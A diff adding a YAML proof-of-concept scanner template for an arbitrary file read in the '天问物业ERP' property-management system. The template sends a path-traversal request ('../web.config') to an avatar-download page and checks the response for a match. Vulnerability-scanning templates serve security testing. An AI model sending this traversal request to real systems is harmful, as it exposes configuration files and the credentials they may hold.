@@ -1,0 +1,9 @@
+name: poc-yaml-天问物业ERP系统-Directory
+description: "任意文件读取"
+method: GET
+path:
+  - /HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config
+expression:
+  status: 200
+  body_any:
+    - "version"
